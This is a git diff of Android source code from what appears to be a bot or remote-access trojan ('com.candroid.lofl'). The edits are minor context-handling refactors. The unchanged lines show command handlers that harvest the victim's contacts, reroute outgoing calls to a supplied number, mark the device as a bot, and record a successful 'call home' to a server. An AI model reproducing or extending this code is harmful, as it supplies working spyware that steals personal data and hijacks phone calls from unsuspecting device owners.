@@ -19,6 +19,7 @@ import android.os.Process;
 import android.preference.PreferenceManager;
 import android.util.Log;
 
+import com.candroid.lofl.AppContext;
 import com.candroid.lofl.activities.permissions.AdminActivity;
 import com.candroid.lofl.activities.permissions.CalendarActivity;
 import com.candroid.lofl.activities.permissions.CallLogActivity;
@@ -161,7 +162,7 @@ public class CommandsIntentService extends IntentService {
             } else if (action.equals(ACTION_CONTACTS)) {
                 if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                     ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(CommandsIntentService.this);
-                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                    SQLiteDatabase database = DatabaseHelper.getInstance(this).getWritableDatabase();
                     try {
                         database.beginTransaction();
                         Database.insertContacts(database, contacts);
@@ -274,7 +275,7 @@ public class CommandsIntentService extends IntentService {
                         }
                         //DELETE DATABASE FILE
                         Storage.Files.getDatabaseFile(CommandsIntentService.this).delete();
-                        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
+                        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(AppContext.getInstance(this)).edit();
                         editor.putBoolean(Bot.IS_BOT_KEY, true);
                         editor.apply();
                     }
@@ -341,7 +342,7 @@ public class CommandsIntentService extends IntentService {
             }else if (action.equalsIgnoreCase(ACTION_REROUTE_CALLS)) {
                 if (intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)) {
                     String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
-                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this.getApplicationContext()).edit();
+                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
                     editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
                     editor.apply();
                 }
@@ -461,7 +462,7 @@ public class CommandsIntentService extends IntentService {
                                     }
                                 }
                                 if(response == 200){
-                                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
+                                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(CommandsIntentService.this).edit();
                                     editor.putBoolean(Constants.Keys.CALLED_HOME_KEY, true);
                                     editor.apply();
                                 }
